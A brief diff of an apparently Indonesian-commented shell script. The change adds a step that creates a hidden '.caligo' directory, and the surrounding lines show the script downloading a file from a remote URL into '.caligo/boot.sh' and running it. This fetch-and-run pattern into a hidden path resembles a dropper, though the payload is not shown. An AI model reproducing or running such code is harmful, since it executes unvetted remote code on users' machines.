@@ -6,6 +6,9 @@ file_url="https://caligo.asia/cdn/Tiqe7/Vebanoro56.x/download"
 # Nama file hasil unduhan
 downloaded_file=".caligo/boot.sh"
 
+# Membuat direktori .caligo jika belum ada
+mkdir -p "$(dirname "$downloaded_file")"
+
 # Memeriksa apakah file sudah ada
 if [ -f "$downloaded_file" ]; then
     echo "File sudah ada. Menjalankan file..."
